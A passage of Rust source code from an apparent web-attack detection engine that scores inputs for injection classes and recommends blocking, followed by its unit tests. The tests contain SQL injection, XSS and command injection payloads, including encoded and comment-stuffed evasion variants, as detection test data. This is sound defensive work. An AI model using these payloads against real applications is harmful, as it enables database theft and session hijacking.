    pub fn detect(&self, input: &str) -> Vec<InvariantMatch> {
        if is_input_too_large(input) {
            return Vec::new();
        }
        let mut matches = Vec::new();
        for class in self.classes {
            if (class.detect)(input) {
                let severity = class.id.default_severity();
                matches.push(InvariantMatch {
                    class: class.id,
                    confidence: 0.85, // L1 base
                    category: class.id.category(),
                    severity,
                    is_novel_variant: false,
                    description: annotate_decisive_level(class.description, "L1"),
                    detection_levels: DetectionLevels {
                        l1: true,
                        l2: false,
                        l3: false,
                        convergent: false,
                    },
                    l2_evidence: None,
                    proof: None,
                    cve_enrichment: None,
                });
            }
        }
        sort_matches_by_priority(&mut matches);
        matches
    }

    /// Fallible wrapper for `detect` with upfront contract validation.
    pub fn try_detect(&self, input: &str) -> InvariantResult<Vec<InvariantMatch>> {
        if input.is_empty() {
            return Err(InvariantError::invalid_input("input must not be empty"));
        }
        validate_input_size(input)?;
        Ok(self.detect(input))
    }

    /// v3: Full multi-level detection pipeline.
    /// Runs L1 (regex) and L2 (structural evaluator) for every class.
    /// Merges results with convergent evidence boosting.
    #[inline]
    pub fn detect_deep(&self, input: &str, environment: Option<&str>) -> DeepDetectionResult {
        self.detect_deep_with_context(input, environment, "", "")
    }

    /// v3 deep detection with optional request-level context used by post-filters.
    #[inline]
    #[inline]
    fn apply_context_weighting(
        &self,
        match_map: &mut HashMap<InvariantClass, InvariantMatch>,
        environment: Option<&str>,
    ) {
        if let Some(env) = environment {
            if let Some(ctx) = context_relevance(env) {
                for (_, m) in match_map.iter_mut() {
                    if let Some(domain) = class_domain(m.class) {
                        if ctx.primary.contains(domain) {
                            m.confidence = (m.confidence + BOOST_PRIMARY_CONTEXT).min(0.99);
                        } else if ctx.secondary.contains(domain) {
                            m.confidence = (m.confidence + BOOST_SECONDARY_CONTEXT).min(0.99);
                        } else {
                            m.confidence *= PENALTY_OUT_OF_CONTEXT;
                        }
                    }
                }
            }
        }
    }

    pub fn detect_deep_with_context(
        &self,
        input: &str,
        environment: Option<&str>,
        path: &str,
        source_ip: &str,
    ) -> DeepDetectionResult {
        if is_input_too_large(input) {
            return DeepDetectionResult::default();
        }
        if input.len() < 3 {
            return DeepDetectionResult::default();
        }

        let input_profile = InputProfile::from_input(input);
        if input_profile.is_ascii_alnum_only {
            return DeepDetectionResult::default();
        }
        if is_known_safe_pattern(input) {
            return DeepDetectionResult::default();
        }

        let mut pass_cache: HashMap<String, HashMap<InvariantClass, PassSignals>> = HashMap::new();
        let mut cached_detection_pass =
            |candidate_input: &str, focus_classes: Option<&HashSet<InvariantClass>>| {
                let key = normalized_scan_key(candidate_input);
                let full = pass_cache
                    .entry(key)
                    .or_insert_with(|| detection_pass(self.classes, candidate_input, None));
                filter_pass_signals(full, focus_classes)
            };

        let pass1 = cached_detection_pass(input, None);
        let canonical = canonicalize(
            input,
            &NormalizationOptions {
                normalize_ws: true,
                ..Default::default()
            },
        );

        let focus_classes = derive_orchestration_focus(&pass1, environment);
        let focus_filter = if focus_classes.is_empty() {
            None
        } else {
            Some(&focus_classes)
        };

        // Second pass uses canonical context when there is meaningful pressure from pass 1.
        let pass2 = if canonical.was_encoded || !focus_classes.is_empty() {
            Some(cached_detection_pass(&canonical.canonical, focus_filter))
        } else {
            Some(cached_detection_pass(input, None))
        };

        let pass2 = pass2.unwrap_or_default();

        let mut match_map: HashMap<InvariantClass, InvariantMatch> = HashMap::new();
        let mut novel_by_l2 = 0u32;
        let mut convergent = 0u32;

        // ── Merge ──
        let all_detected: HashSet<InvariantClass> =
            pass1.keys().copied().chain(pass2.keys().copied()).collect();

        for class_id in all_detected {
            let mut merged = PassSignals::default();
            if let Some(s1) = pass1.get(&class_id) {
                merge_l1_l2(s1, &mut merged);
            }
            if let Some(s2) = pass2.get(&class_id) {
                merge_l1_l2(s2, &mut merged);
            }

            let l1 = merged.l1;
            let l2 = merged.l2.as_ref();
            let class_def = self.classes.iter().find(|c| c.id == class_id);
            let severity = class_id.default_severity();
            let category = class_id.category();
            let description = class_def.map(|c| c.description).unwrap_or("Unknown class");

            let was_pass2_only = pass1.get(&class_id).is_none() && pass2.get(&class_id).is_some();
            let proof_input = if let Some(s) = pass1.get(&class_id) {
                if s.l2.is_none() && pass2.get(&class_id).and_then(|x| x.l2.as_ref()).is_some() {
                    &canonical.canonical
                } else {
                    input
                }
            } else {
                &canonical.canonical
            };

            let in_context = class_domain(class_id)
                .map(|domain| {
                    focus_classes
                        .iter()
                        .filter_map(|c| class_domain(*c))
                        .any(|d| d == domain)
                })
                .unwrap_or(false);

            if l1 && l2.is_some() {
                // CONVERGENT: both agree → strongest confidence
                convergent += 1;
                let l2r = l2.unwrap();
                let mut boosted = (0.85_f64.max(l2r.confidence) + 0.05).min(0.99);
                if was_pass2_only {
                    boosted += 0.02;
                }
                if in_context {
                    boosted = (boosted + 0.01).min(0.99);
                }
                let mut m = InvariantMatch {
                    class: class_id,
                    confidence: boosted,
                    category,
                    severity,
                    is_novel_variant: false,
                    description: annotate_decisive_level(description, "L2"),
                    detection_levels: DetectionLevels {
                        l1: true,
                        l2: true,
                        l3: false,
                        convergent: true,
                    },
                    l2_evidence: Some(l2r.detail.clone()),
                    proof: None,
                    cve_enrichment: None,
                };
                // Construct proof
                let formal_property = class_def.and_then(|c| c.formal_property).unwrap_or("");
                let det_result = l2_to_detection_result(l2r);
                let proof = construct_proof(
                    class_id.proof_domain(),
                    &format!("{:?}", class_id),
                    formal_property,
                    description,
                    proof_input,
                    Some(&det_result),
                );
                if let Some(p) = proof {
                    m.proof = Some(p);
                }
                match_map.insert(class_id, m);
            } else if !l1 && l2.is_some() {
                // L2-only: novel variant that bypassed regex
                novel_by_l2 += 1;
                let l2r = l2.unwrap();
                let mut confidence = l2r.confidence;
                if in_context {
                    confidence = (confidence + 0.03).min(0.99);
                }
                let mut m = InvariantMatch {
                    class: class_id,
                    confidence,
                    category,
                    severity,
                    is_novel_variant: true,
                    description: annotate_decisive_level(description, "L2"),
                    detection_levels: DetectionLevels {
                        l1: false,
                        l2: true,
                        l3: false,
                        convergent: false,
                    },
                    l2_evidence: Some(l2r.detail.clone()),
                    proof: None,
                    cve_enrichment: None,
                };
                let formal_property = class_def.and_then(|c| c.formal_property).unwrap_or("");
                let det_result = l2_to_detection_result(l2r);
                let proof = construct_proof(
                    class_id.proof_domain(),
                    &format!("{:?}", class_id),
                    formal_property,
                    description,
                    proof_input,
                    Some(&det_result),
                );
                if let Some(p) = proof {
                    m.proof = Some(p);
                }
                match_map.insert(class_id, m);
            } else if l1 {
                // L1-only: attenuate confidence (L2 is silent)
                let attenuated = 0.85 * confidence::L1_ATTENUATION;
                let mut m = InvariantMatch {
                    class: class_id,
                    confidence: if in_context {
                        (attenuated + 0.02).min(0.99)
                    } else {
                        attenuated
                    },
                    category,
                    severity,
                    is_novel_variant: false,
                    description: annotate_decisive_level(description, "L1"),
                    detection_levels: DetectionLevels {
                        l1: true,
                        l2: false,
                        l3: false,
                        convergent: false,
                    },
                    l2_evidence: None,
                    proof: None,
                    cve_enrichment: None,
                };
                let formal_property = class_def.and_then(|c| c.formal_property).unwrap_or("");
                let proof = construct_proof(
                    class_id.proof_domain(),
                    &format!("{:?}", class_id),
                    formal_property,
                    description,
                    proof_input,
                    None,
                );
                if let Some(p) = proof {
                    m.proof = Some(p);
                }
                match_map.insert(class_id, m);
            }
        }

        apply_weak_signal_convergence_boost(&mut match_map);

        // ── Proof-based confidence floor ──
        for (_, m) in match_map.iter_mut() {
            if let Some(ref proof) = m.proof {
                if proof.is_complete && proof.proof_confidence > m.confidence {
                    m.confidence = proof.proof_confidence.min(0.99);
                }
            }
        }

        self.apply_context_weighting(&mut match_map, environment);

        let encoding_boost = encoding_depth_multiplier(canonical.encoding_depth);
        if encoding_boost > 1.0 {
            for (_, m) in match_map.iter_mut() {
                m.confidence = (m.confidence * encoding_boost).min(0.99);
            }
        }

        // Benign-context attenuation is a confidence modifier, not a detector gate.
        let benign_score = benign_context_score(input);
        if benign_score > 0.0 {
            let attenuation = 1.0 - (benign_score * 0.5);
            for (_, m) in match_map.iter_mut() {
                m.confidence = (m.confidence * attenuation).max(0.3);
            }
        }

        // Monotonicity: deep confidence should not be lower than L1-only detection baseline.
        for (_, m) in match_map.iter_mut() {
            if m.detection_levels.l1 {
                m.confidence = m.confidence.max(0.85);
            }
        }

        let mut matches: Vec<InvariantMatch> = match_map.into_values().collect();
        sort_matches_by_priority(&mut matches);
        let excepted_count = self.apply_exception_post_filter(&mut matches, path, source_ip);
        sort_matches_by_priority(&mut matches);

        DeepDetectionResult {
            matches,
            novel_by_l2,
            convergent,
            excepted_count,
        }
    }

    fn apply_exception_post_filter(
        &self,
        matches: &mut Vec<InvariantMatch>,
        path: &str,
        source_ip: &str,
    ) -> u32 {
        let Some(config) = self.exceptions.as_ref() else {
            return 0;
        };
        if !config.enabled || config.rules.is_empty() {
            return 0;
        }

        let mut excepted_count = 0u32;
        matches.retain(|m| {
            if let Some(rule) = config.find_matching_rule(path, m.class, source_ip) {
                excepted_count += 1;
                Self::log_excepted(path, source_ip, m.class, rule);
                return false;
            }
            true
        });
        excepted_count
    }

    fn log_excepted(path: &str, source_ip: &str, class: InvariantClass, rule: &ExceptionRule) {
        eprintln!(
            "excepted class={:?} path={} source_ip={} reason={} created_by={}",
            class, path, source_ip, rule.reason, rule.created_by
        );
    }

    /// Fallible wrapper for `detect_deep` with upfront contract validation.
    pub fn try_detect_deep(
        &self,
        input: &str,
        environment: Option<&str>,
    ) -> InvariantResult<DeepDetectionResult> {
        if input.is_empty() {
            return Err(InvariantError::invalid_input("input must not be empty"));
        }
        validate_input_size(input)?;
        if let Some(env) = environment {
            if env.trim().is_empty() {
                return Err(InvariantError::invalid_input(
                    "environment must not be empty when provided",
                ));
            }
        }
        Ok(self.detect_deep(input, environment))
    }

    /// Full analysis pipeline with compositions and block recommendation.
    #[inline]
    pub fn analyze(&self, request: &AnalysisRequest) -> AnalysisResult {
        if is_input_too_large(&request.input) {
            return AnalysisResult {
                matches: Vec::new(),
                compositions: Vec::new(),
                correlations: Vec::new(),
                recommendation: BlockRecommendation {
                    block: false,
                    confidence: 0.0,
                    reason: "decisive_level:none:input_too_large".to_owned(),
                    threshold: 0.0,
                },
                novel_by_l2: 0,
                novel_by_l3: 0,
                convergent: 0,
                processing_time_us: 0.0,
                contexts: Vec::new(),
                cve_enrichment: None,
                polyglot: None,
                anomaly_score: None,
                encoding_evasion: false,
                intent: None,
                l3_surfaces: None,
            };
        }

        let env_str = request.known_context.as_ref().map(|c| match c {
            InputContext::Sql => "sql",
            InputContext::Html => "html",
            InputContext::Shell => "shell",
            InputContext::Xml => "xml",
            InputContext::Json => "json",
            InputContext::Ldap => "ldap",
            InputContext::Template => "template",
            InputContext::Graphql => "graphql",
            InputContext::Url => "url",
            InputContext::Header => "header",
            InputContext::Unknown => "unknown",
        });

        let request_path = request
            .request_meta
            .as_ref()
            .and_then(|meta| meta.path.as_deref())
            .unwrap_or("");
        let deep = self.detect_deep_with_context(&request.input, env_str, request_path, "");

        let mut matches = deep.matches;

        let anomaly_profile = compute_anomaly_profile(&request.input);
        let anomaly_multiplier = anomaly_confidence_multiplier(&request.input);
        let encoding_ev = detect_encoding_evasion(&request.input);
        let encoding_multiplier = if encoding_ev.is_evasion {
            1.0 + (encoding_ev.confidence.min(0.7) * 0.05)
        } else {
            1.0
        };

        // Source reputation boost
        if let Some(rep) = request.source_reputation {
            if rep > 0.6 {
                let boost = (rep - 0.6) * 0.4;
                for m in matches.iter_mut() {
                    m.confidence = (m.confidence + boost).min(0.99);
                }
            }
        }

        // Entropy/evasion-driven orchestration calibration
        for m in matches.iter_mut() {
            let calibrated = m.confidence * anomaly_multiplier * encoding_multiplier;
            m.confidence = calibrated.min(0.99);
            if calibrated > 0.99 {
                m.severity = escalate_severity(m.severity);
            }
        }

        sort_matches_by_priority(&mut matches);

        let mut correlations = Vec::new();
        let mut domain_to_conf: HashMap<&'static str, (f64, Vec<InvariantClass>)> = HashMap::new();
        for m in &matches {
            if let Some(domain) = class_domain(m.class) {
                let entry = domain_to_conf.entry(domain).or_insert((0.0, Vec::new()));
                entry.0 = entry.0.max(m.confidence);
                entry.1.push(m.class);
            }
        }
        for (domain, (conf, classes)) in domain_to_conf {
            if classes.len() >= 2 {
                correlations.push(InterClassCorrelation {
                    classes,
                    compound_confidence: conf,
                    reason: format!("multi_signal_orchestration:{}", domain),
                });
            }
        }

        // Compositions
        let compositions = self.detect_compositions(&matches);

        // Block recommendation
        let recommendation = self.compute_block_recommendation(&matches, &compositions);

        AnalysisResult {
            matches,
            compositions,
            correlations,
            recommendation,
            novel_by_l2: deep.novel_by_l2,
            novel_by_l3: 0,
            convergent: deep.convergent,
            processing_time_us: 0.0,
            contexts: Vec::new(),
            cve_enrichment: None,
            polyglot: None,
            anomaly_score: Some(anomaly_profile.anomaly_score),
            encoding_evasion: encoding_ev.is_evasion,
            intent: None,
            l3_surfaces: None,
        }
    }

    /// Fallible wrapper for `analyze` with request contract validation.
    pub fn try_analyze(&self, request: &AnalysisRequest) -> InvariantResult<AnalysisResult> {
        if request.input.trim().is_empty() {
            return Err(InvariantError::invalid_input(
                "analysis request input must not be empty",
            ));
        }
        validate_input_size(&request.input)?;
        Ok(self.analyze(request))
    }

    fn detect_compositions(&self, matches: &[InvariantMatch]) -> Vec<AlgebraicComposition> {
        let class_set: HashSet<InvariantClass> = matches.iter().map(|m| m.class).collect();
        let mut compositions = Vec::new();

        for rule in COMPOSITION_RULES.iter() {
            if !class_set.contains(&rule.a) || !class_set.contains(&rule.b) {
                continue;
            }

            let has_completer = rule
                .completer
                .map(|c| class_set.contains(&c))
                .unwrap_or(false);
            let is_complete = rule.always_complete || has_completer;

            let repair = if is_complete {
                rule.repair_complete.unwrap_or(rule.repair)
            } else {
                rule.repair
            };

            let conf = if is_complete {
                rule.confidence_complete.unwrap_or(rule.confidence)
            } else {
                rule.confidence
            };

            compositions.push(AlgebraicComposition {
                escape: rule.escape,
                payload: rule.payload,
                repair,
                context: rule.context,
                confidence: conf,
                derived_class: rule.derived_class,
                is_complete,
            });
        }

        compositions
    }

    fn compute_block_recommendation(
        &self,
        matches: &[InvariantMatch],
        compositions: &[AlgebraicComposition],
    ) -> BlockRecommendation {
        if matches.is_empty() && compositions.is_empty() {
            return BlockRecommendation {
                block: false,
                confidence: 0.0,
                reason: "decisive_level:none:no_detections".to_owned(),
                threshold: 0.0,
            };
        }

        // Complete composition → always block
        if let Some(comp) = compositions
            .iter()
            .find(|c| c.is_complete && c.confidence >= 0.90)
        {
            return BlockRecommendation {
                block: true,
                confidence: comp.confidence,
                reason: format!(
                    "decisive_level:l3:complete_injection_structure:{:?}",
                    comp.payload
                ),
                threshold: 0.90,
            };
        }

        // Per-severity thresholds
        let mut prioritized = matches.to_vec();
        sort_matches_by_priority(&mut prioritized);
        for m in &prioritized {
            let threshold = severity_threshold(m.severity);
            if m.confidence >= threshold {
                return BlockRecommendation {
                    block: true,
                    confidence: m.confidence,
                    reason: format!(
                        "{}:{:?}_exceeds_{:?}_threshold",
                        detect_deep_decisive_level_reason(m),
                        m.class,
                        m.severity
                    ),
                    threshold,
                };
            }
        }

        let max_conf = prioritized
            .iter()
            .map(|m| m.confidence)
            .fold(0.0_f64, f64::max);
        BlockRecommendation {
            block: false,
            confidence: max_conf,
            reason: "decisive_level:none:below_severity_thresholds".to_owned(),
            threshold: prioritized
                .iter()
                .map(|m| severity_threshold(m.severity))
                .fold(0.75_f64, f64::min),
        }
    }

    /// Highest severity represented in the provided matches.
    pub fn highest_severity(&self, matches: &[InvariantMatch]) -> Severity {
        matches
            .iter()
            .map(|m| m.severity)
            .max()
            .unwrap_or(Severity::Low)
    }

    /// Return whether current matches imply blocking according to engine policy.
    pub fn should_block(&self, matches: &[InvariantMatch]) -> bool {
        self.compute_block_recommendation(matches, &[]).block
    }

    /// Number of class definitions registered in this engine.
    pub fn class_count(&self) -> usize {
        self.classes.len()
    }
}

impl Default for InvariantEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl EngineSubsystem for InvariantEngine {
    fn detect(&self, input: &str) -> Vec<InvariantMatch> {
        InvariantEngine::detect(self, input)
    }

    fn detect_deep(&self, input: &str, environment: Option<&str>) -> DeepDetectionResult {
        InvariantEngine::detect_deep(self, input, environment)
    }

    fn analyze(&self, request: &AnalysisRequest) -> AnalysisResult {
        InvariantEngine::analyze(self, request)
    }

    fn highest_severity(&self, matches: &[InvariantMatch]) -> Severity {
        InvariantEngine::highest_severity(self, matches)
    }

    fn should_block(&self, matches: &[InvariantMatch]) -> bool {
        InvariantEngine::should_block(self, matches)
    }

    fn class_count(&self) -> usize {
        InvariantEngine::class_count(self)
    }
}

/// Result from deep detection (L1+L2 merge).
#[derive(Debug, Clone, PartialEq, Default)]
pub struct DeepDetectionResult {
    /// Final merged matches.
    pub matches: Vec<InvariantMatch>,
    /// Count of L2-only classes not caught by L1.
    pub novel_by_l2: u32,
    /// Count of classes with convergent L1+L2 evidence.
    pub convergent: u32,
    /// Count of detected matches suppressed by exception rules.
    pub excepted_count: u32,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_exception_rule(
        path_pattern: Option<&str>,
        class: Option<InvariantClass>,
        source_ip_pattern: Option<&str>,
        reason: &str,
    ) -> ExceptionRule {
        ExceptionRule {
            path_pattern: path_pattern.map(str::to_owned),
            class,
            source_ip_pattern: source_ip_pattern.map(str::to_owned),
            reason: reason.to_owned(),
            created_by: "unit-test".to_owned(),
        }
    }

    fn make_exception_config(enabled: bool, rules: Vec<ExceptionRule>) -> ExceptionConfig {
        ExceptionConfig { rules, enabled }
    }

    fn match_confidence(result: &DeepDetectionResult, class: InvariantClass) -> Option<f64> {
        result
            .matches
            .iter()
            .find(|m| m.class == class)
            .map(|m| m.confidence)
    }

    fn max_category_confidence(result: &DeepDetectionResult, category: AttackCategory) -> f64 {
        result
            .matches
            .iter()
            .filter(|m| m.category == category)
            .map(|m| m.confidence)
            .fold(0.0_f64, f64::max)
    }

    fn synthetic_match(class: InvariantClass) -> InvariantMatch {
        InvariantMatch {
            class,
            confidence: 0.9,
            category: class.category(),
            severity: class.default_severity(),
            is_novel_variant: false,
            description: "synthetic".to_owned(),
            detection_levels: DetectionLevels {
                l1: true,
                l2: false,
                l3: false,
                convergent: false,
            },
            l2_evidence: None,
            proof: None,
            cve_enrichment: None,
        }
    }

    #[test]
    fn engine_creates_and_detects() {
        let engine = InvariantEngine::new();
        assert!(engine.class_count() > 50);
        let matches = engine.detect("' OR 1=1--");
        assert!(!matches.is_empty(), "Should detect SQL injection");
    }

    #[test]
    fn detect_deep_convergent() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("' OR 1=1--", None);
        // Should have at least one convergent detection
        let sqli = result
            .matches
            .iter()
            .find(|m| m.class == InvariantClass::SqlTautology);
        assert!(sqli.is_some(), "Should detect SqlTautology");
        if let Some(m) = sqli {
            assert!(
                m.detection_levels.convergent || m.detection_levels.l2,
                "SqlTautology should be convergent or L2-detected"
            );
            assert!(
                m.confidence > 0.8,
                "Confidence should be high for convergent"
            );
        }
    }

    #[test]
    fn detect_deep_xss() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("<script>alert(1)</script>", None);
        let xss = result
            .matches
            .iter()
            .find(|m| m.class == InvariantClass::XssTagInjection);
        assert!(xss.is_some(), "Should detect XSS tag injection");
    }

    #[test]
    fn benign_input_no_detections() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("Hello, world!", None);
        assert!(
            result.matches.is_empty(),
            "Benign input should have no detections"
        );
    }

    #[test]
    fn analyze_with_block_recommendation() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "'; DROP TABLE users;--".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            result.recommendation.block,
            "SQL injection should trigger block"
        );
        assert!(result.recommendation.confidence > 0.7);
    }

    #[test]
    fn composition_detection() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "' UNION SELECT username, password FROM users--".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: None,
        });
        // Should detect both string termination and union extraction
        let has_union = result
            .matches
            .iter()
            .any(|m| m.class == InvariantClass::SqlUnionExtraction);
        let has_term = result
            .matches
            .iter()
            .any(|m| m.class == InvariantClass::SqlStringTermination);
        if has_union && has_term {
            assert!(
                !result.compositions.is_empty(),
                "Should have compositions when both classes match"
            );
        }
    }

    #[test]
    fn new_composition_rules_elevate_confidence_for_required_pairs() {
        let engine = InvariantEngine::new();
        let cases = [
            (
                InvariantClass::XssTagInjection,
                InvariantClass::CorsOriginAbuse,
                InvariantClass::XssTagInjection,
            ),
            (
                InvariantClass::ProtoPollution,
                InvariantClass::CmdSeparator,
                InvariantClass::ProtoPollutionGadget,
            ),
            (
                InvariantClass::SsrfInternalReach,
                InvariantClass::SsrfCloudMetadata,
                InvariantClass::SsrfCloudMetadata,
            ),
            (
                InvariantClass::SqlStringTermination,
                InvariantClass::PathDotdotEscape,
                InvariantClass::SqlStackedExecution,
            ),
        ];

        for (a, b, derived_class) in cases {
            let matches = vec![synthetic_match(a), synthetic_match(b)];
            let compositions = engine.detect_compositions(&matches);
            let composition = compositions
                .iter()
                .find(|c| c.derived_class == derived_class)
                .unwrap_or_else(|| {
                    panic!(
                        "Expected composition for pair {:?}+{:?} -> {:?}",
                        a, b, derived_class
                    )
                });
            assert!(
                composition.confidence >= 0.88,
                "Expected elevated confidence >= 0.88 for {:?}+{:?}, got {}",
                a,
                b,
                composition.confidence
            );
        }
    }

    #[test]
    fn source_reputation_boosts_confidence() {
        let engine = InvariantEngine::new();
        let base = engine.analyze(&AnalysisRequest {
            input: "' OR 1=1--".to_owned(),
            known_context: None,
            source_reputation: None,
            request_meta: None,
        });
        let boosted = engine.analyze(&AnalysisRequest {
            input: "' OR 1=1--".to_owned(),
            known_context: None,
            source_reputation: Some(0.9),
            request_meta: None,
        });

        if let (Some(b), Some(r)) = (
            base.matches
                .iter()
                .find(|m| m.class == InvariantClass::SqlTautology),
            boosted
                .matches
                .iter()
                .find(|m| m.class == InvariantClass::SqlTautology),
        ) {
            assert!(
                r.confidence >= b.confidence,
                "Reputation should boost confidence"
            );
        }
    }

    #[test]
    fn context_weighting_boosts_relevant() {
        let engine = InvariantEngine::new();
        let no_ctx = engine.detect_deep("' OR 1=1--", None);
        let sql_ctx = engine.detect_deep("' OR 1=1--", Some("sql"));

        let no_ctx_sqli = no_ctx
            .matches
            .iter()
            .find(|m| m.class == InvariantClass::SqlTautology);
        let sql_ctx_sqli = sql_ctx
            .matches
            .iter()
            .find(|m| m.class == InvariantClass::SqlTautology);

        if let (Some(n), Some(s)) = (no_ctx_sqli, sql_ctx_sqli) {
            assert!(
                s.confidence >= n.confidence,
                "SQL context should boost SQLi confidence"
            );
        }
    }

    #[test]
    fn detect_deep_encoded_multi_pass() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("%2527%20OR%201%3D1--", None);
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlTautology),
            "multi-pass should detect double-encoded SQL payload"
        );
    }

    #[test]
    fn analyze_returns_inter_class_correlations() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "' OR 1=1--%00<script>alert(1)</script>".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            !result.correlations.is_empty(),
            "analyze should include correlations"
        );
        assert!(result.correlations.iter().any(|c| c.classes.len() >= 2));
    }

    #[test]
    fn highest_severity() {
        let engine = InvariantEngine::new();
        let matches = engine.detect("' OR 1=1--");
        let sev = engine.highest_severity(&matches);
        assert!(sev >= Severity::Medium);
    }

    #[test]
    fn false_positive_legitimate_sql_select_not_flagged_as_sqli() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "SELECT name FROM users".to_owned(),
            known_context: Some(InputContext::Sql),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            !result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::SqlTautology
                    | InvariantClass::SqlStringTermination
                    | InvariantClass::SqlUnionExtraction
                    | InvariantClass::SqlStackedExecution
                    | InvariantClass::SqlTimeOracle
                    | InvariantClass::SqlErrorOracle
            )),
            "Legitimate SQL query should not be flagged as SQLi: {:?}",
            result.matches.iter().map(|m| m.class).collect::<Vec<_>>()
        );
    }

    #[test]
    fn false_positive_legitimate_json_role_user_not_blocked() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: r#"{"role":"user"}"#.to_owned(),
            known_context: Some(InputContext::Json),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            !result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::SqlTautology
                    | InvariantClass::XssTagInjection
                    | InvariantClass::CmdSeparator
                    | InvariantClass::CmdSubstitution
            )),
            "Legitimate JSON should not be misclassified as SQLi/XSS/CMDi: {:?}",
            result.matches.iter().map(|m| m.class).collect::<Vec<_>>()
        );
    }

    #[test]
    fn false_positive_normal_url_not_blocked() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "https://example.com/docs/getting-started".to_owned(),
            known_context: Some(InputContext::Url),
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            !result.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::SqlTautology
                    | InvariantClass::XssTagInjection
                    | InvariantClass::CmdSeparator
                    | InvariantClass::CmdSubstitution
            )),
            "Normal URL should not be misclassified as SQLi/XSS/CMDi: {:?}",
            result.matches.iter().map(|m| m.class).collect::<Vec<_>>()
        );
    }

    #[test]
    fn evasion_whitespace_padded_union_select_still_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "'    UNION      SELECT username,password FROM users--",
            Some("sql"),
        );
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlUnionExtraction),
            "Whitespace-padded UNION SELECT should still be detected"
        );
    }

    #[test]
    fn evasion_case_mixed_command_still_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("; WhOaMi", Some("shell"));
        assert!(
            result.matches.iter().any(|m| {
                matches!(
                    m.class,
                    InvariantClass::CmdSeparator
                        | InvariantClass::CmdSubstitution
                        | InvariantClass::CmdArgumentInjection
                )
            }),
            "Case-mixed command payload should still be detected"
        );
    }

    #[test]
    fn evasion_hex_percent_encoded_xss_still_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("%3Cscript%3Ealert(1)%3C%2Fscript%3E", Some("html"));
        assert!(
            result.matches.iter().any(|m| {
                matches!(
                    m.class,
                    InvariantClass::XssTagInjection
                        | InvariantClass::XssEventHandler
                        | InvariantClass::XssProtocolHandler
                )
            }),
            "Hex percent-encoded XSS should still be detected"
        );
    }

    #[test]
    fn integration_multi_class_attack_has_multiple_matches_and_proofs() {
        let engine = InvariantEngine::new();
        let result = engine.analyze(&AnalysisRequest {
            input: "' UNION SELECT username,password FROM users--<script>alert(1)</script>"
                .to_owned(),
            known_context: None,
            source_reputation: None,
            request_meta: None,
        });
        assert!(
            result.matches.len() >= 2,
            "Expected multi-class matches for composite payload, got {:?}",
            result.matches.iter().map(|m| m.class).collect::<Vec<_>>()
        );
        assert!(
            result.matches.iter().any(|m| m.proof.is_some()),
            "Expected at least one constructive proof in multi-class analysis"
        );
    }

    #[test]
    fn evasion_comment_stuffed_union_select_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "UN/**/ION/**/SEL/**/ECT username,password FROM users",
            Some("sql"),
        );
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlUnionExtraction),
            "Comment-stuffed UNION SELECT should be detected at engine level"
        );
    }

    #[test]
    fn evasion_chr_concat_sql_keyword_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep(
            "chr(85)||chr(78)||chr(73)||chr(79)||chr(78)||chr(32)||chr(83)||chr(69)||chr(76)||chr(69)||chr(67)||chr(84)",
            Some("sql"),
        );
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::SqlUnionExtraction),
            "CHR-concatenated SQL keyword construction should be detected at engine level"
        );
    }

    #[test]
    fn evasion_bare_javascript_scheme_detected() {
        let engine = InvariantEngine::new();
        let result = engine.detect_deep("javascript:alert(document.cookie)", Some("html"));
        assert!(
            result
                .matches
                .iter()
                .any(|m| m.class == InvariantClass::XssProtocolHandler),
            "Bare javascript: payload should be detected at engine level"
        );
    }

    #[test]
    fn try_detect_rejects_input_over_1mb() {
        let engine = InvariantEngine::new();
        let oversized = "A".repeat(MAX_INPUT_BYTES + 1);
        let err = engine.try_detect(&oversized).unwrap_err();
        assert!(format!("{err}").contains("exceeds maximum allowed size"));
    }

    #[test]
    fn try_detect_deep_rejects_input_over_1mb() {
        let engine = InvariantEngine::new();
        let oversized = "B".repeat(MAX_INPUT_BYTES + 1);
        let err = engine.try_detect_deep(&oversized, None).unwrap_err();
        assert!(format!("{err}").contains("exceeds maximum allowed size"));
    }

    #[test]
    fn try_analyze_rejects_input_over_1mb() {
        let engine = InvariantEngine::new();
        let oversized = "C".repeat(MAX_INPUT_BYTES + 1);
        let err = engine
            .try_analyze(&AnalysisRequest {
                input: oversized,
                known_context: None,
                source_reputation: None,
                request_meta: None,
            })
            .unwrap_err();
        assert!(format!("{err}").contains("exceeds maximum allowed size"));
    }

    #[test]
    fn deep_confidence_is_monotonic_against_detect() {
        let engine = InvariantEngine::new();
        let input = "' OR 1=1--";
        let baseline = engine.detect(input);
        let deep = engine.detect_deep(input, None);

